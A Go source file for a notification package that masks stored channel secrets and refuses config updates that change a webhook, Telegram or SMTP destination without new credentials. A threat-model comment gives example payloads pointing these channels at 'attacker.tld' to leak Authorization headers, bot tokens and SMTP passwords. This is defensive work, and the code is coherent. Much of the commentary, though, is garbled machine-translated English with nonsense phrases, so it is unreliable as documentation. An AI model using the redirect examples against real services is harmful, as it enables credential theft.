package notify

import (
	"encoding/json"
	"fmt"
	"strings"
)

// MaskedPrefix It's a prefix to the mask value..API Replace real content with prefix values when retrospect documents,
// Update interface is understood to receive values with prefixes[Keep the original value in the library unchanged].
//
// Use prefix instead of an empty string or a fixed constant to be able to attach a discernable message.
// (See MaskedValue),Let the user distinguish.[What kind of robot is this?]No need to repaint the key.
const MaskedPrefix = "__masked__"

// MaskedValue Generate a mask value:
//
//	"__masked__"              The original value is too short to give any hint.
//	"__masked__:…ab12cd"      Take the original end. 6 Bits as identifiers
//
// Only the end. 6 The position was chosen deliberately.:Webhook The address identification information is at the end. key,
// Flying Book robot. id),The prefixes are identical and unrecognized. End 6 Not enough.
// Revert the evidence, but it's enough for the configuration to recognize it.[It's my group.].
func MaskedValue(secret string) string {
	if len(secret) <= 6 {
		return MaskedPrefix
	}
	return MaskedPrefix + ":…" + secret[len(secret)-6:]
}

// IsMasked Report whether a value is a mask value (i.e. the interface is not modified after display)).
func IsMasked(v string) bool { return strings.HasPrefix(v, MaskedPrefix) }

// MaskConfig Returns a copy of the configuration and replaces the certificate field of the channel with a mask value.
//
// Unknown channel type returns empty map Not the original configuration.——I'd rather. UI Display[Configure Not Available],
// I don't want to throw back all the original content that might be supported when the type of channel cannot be identified..
// Retain field as it is.,UI It's a normal display..
func MaskConfig(kind string, cfg map[string]any) map[string]any {
	channel, ok := Get(kind)
	if !ok {
		return map[string]any{}
	}
	secrets := map[string]bool{}
	for _, k := range channel.SecretKeys() {
		secrets[k] = true
	}
	out := make(map[string]any, len(cfg))
	for k, v := range cfg {
		if !secrets[k] {
			out[k] = v
			continue
		}
		// headers These embedded structures are treated as a whole on a single basis: individual sub-key judgement requires every channel.
		// One more.[Which subkeys are based on evidence?]The rules, the complexity is far beyond the proceeds..
		if s, ok := v.(string); ok {
			out[k] = MaskedValue(s)
			continue
		}
		out[k] = MaskedPrefix
	}
	return out
}

// ErrDestinationChangedWithoutCredentials Organisation[Target's address changed, but the call was not made.
// Statement by Document Field].Returning to it is not a silent release or a silent abandonment of evidence, for the reasons given. PrepareConfigUpdate.
type ErrDestinationChangedWithoutCredentials struct {
	Changed []string // Changed Destination Key
	Missing []string // Certificate key with no visible expression
}

func (e *ErrDestinationChangedWithoutCredentials) Error() string {
	return "Destination Address(" + strings.Join(e.Changed, ",") + ")Changed, refill the certificate field at the same time(" +
		strings.Join(e.Missing, ",") + "):Fill in a new value, or leave a visible blank to indicate that proof is no longer required." +
		"The original certificate is valid only for the old address, and continuing to do so means giving it to the new address.."
}

// PrepareConfigUpdate Merge channel configuration, and process[Change of target address]This is a sensitive security situation..
//
// It replaces naked. MergeConfig Use the channel to update the path.:
// The target address (where the message is sent) is two separate fields (in what identity) and MergeConfig
// Yes[Keys not mentioned]always keep the original value in the library. So whatever it takes. PATCH The people in the channel just...**Change address only,
// We're not talking about evidence.**,So that the server can send the evidence in the library to the end of its control.:
//
//	webhook  {config:{url:"https://attacker.tld"}}  → Original Authorization Head out with request.
//	telegram {config:{base_url:"https://attacker.tld"}} → /bot<TrueToken>/sendMessage
//	email    {config:{host:"smtp.attacker.tld"}}    → STARTTLS Then hand over the username and password
//
// This path is completely silent and non-redirectional.),
// And it's going straight through the cover of this bag.——[Evidence does not show back to browser].
//
// Rule: As long as a destination key is changed to a new value, the caller must be correct**Every one.**Note key expression:
//   - Give new value → New Value
//   - Visible emptiness string → The field no longer needs to be supported (retain empty semantics))
//   - Return mask value as it is / Why don't you just forget the key? → Reject
//
// And the third reason for the rejection is because[Mask value]That's exactly what it means.[Follow old evidence.],And old evidence.
// Only valid for old addresses. I don't want to do it here.[Automatically discard documents]——The optional proof fields.
// (webhook of headers,email of password)♪ Will be silent ♪[We've lost access, but the interface is back. 200],
// It's harder to check than reporting mistakes. I'd rather have the operator fill it out again..
func PrepareConfigUpdate(kind string, stored, incoming map[string]any) (map[string]any, error) {
	channel, ok := Get(kind)
	if !ok {
		return nil, fmt.Errorf("Channel type %q Unregistered", kind)
	}
	secrets := channel.SecretKeys()
	destinations := channel.DestinationKeys()

	// A proof value for a non-string (e.g.) webhook of headers It's an object.,
	// Description of the caller[Keep original value]The sentry is inside the structure..MergeConfig Only[String
	// And with prefixes.]For cover, this form is stored as a normal object.——The library really dropped the volume.
	// "__masked__",Follow-up silence has failed and there have been no errors. I'd rather say no..
	//
	// This check must be placed.**Front**:If the address doesn't change, we'll be back early.
	// Only covered.[Change Address]This path.).
	if err := rejectMaskedInContainers(incoming, secrets); err != nil {
		return nil, err
	}

	// Find the real changed destination key. The mask value equals[No change.].
	var changed []string
	for _, key := range destinations {
		raw, present := incoming[key]
		if !present {
			continue
		}
		s, isStr := raw.(string)
		if isStr && IsMasked(s) {
			continue
		}
		if !sameConfigValue(raw, stored[key]) {
			changed = append(changed, key)
		}
	}
	if len(changed) == 0 {
		// Address unchanged, normal merge (mask value retained, empty string emptied, left over)).
		return MergeConfig(stored, incoming), nil
	}

	// Address changed: Requires a clear statement of each card key.
	var missing []string
	for _, key := range secrets {
		raw, present := incoming[key]
		if !present {
			missing = append(missing, key)
			continue
		}
		if s, isStr := raw.(string); isStr && IsMasked(s) {
			missing = append(missing, key)
		}
	}
	if len(missing) > 0 {
		return nil, &ErrDestinationChangedWithoutCredentials{Changed: changed, Missing: missing}
	}
	return MergeConfig(stored, incoming), nil
}

// rejectMaskedInContainers Refusal to embed sentry in a non-string structure.
//
// The cover mechanism is premised on[The whole value is a string.].Yeah. webhook of headers This object field,
// Full mask only (written as string) "__masked__")or overall submission; sentry inside the object
// I can't express it.[No change],They'll be saved as real values. Library.
func rejectMaskedInContainers(incoming map[string]any, secretKeys []string) error {
	for _, key := range secretKeys {
		raw, present := incoming[key]
		if !present {
			continue
		}
		if _, isStr := raw.(string); isStr {
			continue
		}
		encoded, err := json.Marshal(raw)
		if err != nil {
			continue
		}
		if strings.Contains(string(encoded), MaskedPrefix) {
			return fmt.Errorf("Field %s The contents contain mask marks. %q:The field can only be left empty as a whole to indicate that new values are followed, or submitted as a whole, and cannot be placed under mask inside the structure",
				key, MaskedPrefix)
		}
	}
	return nil
}

// sameConfigValue Compares whether the two configuration values are equal. Use JSON Sequenced comparisons are made to adapt.
// Type difference——The port for the front-end submission is number,And Curly read it. float64,Direct == It's a miscalculation..
//
// [Empty]It has to be normalized and compared: empty strings and[Key does not exist]It's the same state in this configuration model.,
// Because... MergeConfig Empty the string as visible, straight. delete Drop that key. If not, one.
// Always leave empty optional destination fields(Telegram of base_url The only such field: leave empty
// This is the path.——
//
//	Save on New base_url:""  →  First saved by MergeConfig Delete Keys
//	→ Second time saved incoming Yes "",stored We've lost the key.[The address changed.]
//	→ The evidence is a mask value. → 400[Target address changed. Please refill the certificate field at the same time]
//
// Every time since then, every save failed, unless the user re-painted Bot Token,And he hasn't changed anything..
func sameConfigValue(a, b any) bool {
	if isBlankConfigValue(a) && isBlankConfigValue(b) {
		return true
	}
	ra, errA := json.Marshal(a)
	rb, errB := json.Marshal(b)
	if errA != nil || errB != nil {
		return false
	}
	return string(ra) == string(rb)
}

// isBlankConfigValue Determines whether a configuration value is[Empty].
// The caliber must be MergeConfig The clearance decision is consistent.(strings.TrimSpace(s) == ""),
// Or else it will.[MergeConfig I think it should be deleted.,sameConfigValue Consider it worth it.]The stitches..
func isBlankConfigValue(v any) bool {
	if v == nil {
		return true
	}
	s, ok := v.(string)
	return ok && strings.TrimSpace(s) == ""
}

// MergeConfig handle incoming Merge to stored Above, to update channel configuration.
//
// Rules:
//   - incoming The key with the middle as the mask → Reservations stored Other Organiser)
//   - incoming Key with an empty string → Consider visible empty, remove the key
//   - Other Keys → Use incoming Value Overwrite
//   - stored It's in there. incoming Keys not inside → Keep (locally updated syntax))
//
// Can an empty string count?[Clear]Need to be clear: the front-end sheet submits unfilled fields as empty strings,
// If it's written as a valid value, it'll be written in[Empty to keep original value]The fields are really cleared..
// Select here the visible emptiness because the user has no other expression when trying to clear an error field
// (Drag fields to distinguish[Not provided]With[Provide empty value],But... UI It doesn't make any difference.).
func MergeConfig(stored, incoming map[string]any) map[string]any {
	out := make(map[string]any, len(stored)+len(incoming))
	for k, v := range stored {
		out[k] = v
	}
	for k, v := range incoming {
		if s, ok := v.(string); ok {
			if IsMasked(s) {
				continue // Mask value = Unmodified, retained stored
			}
			if strings.TrimSpace(s) == "" {
				delete(out, k)
				continue
			}
			out[k] = s
			continue
		}
		out[k] = v
	}
	return out
}
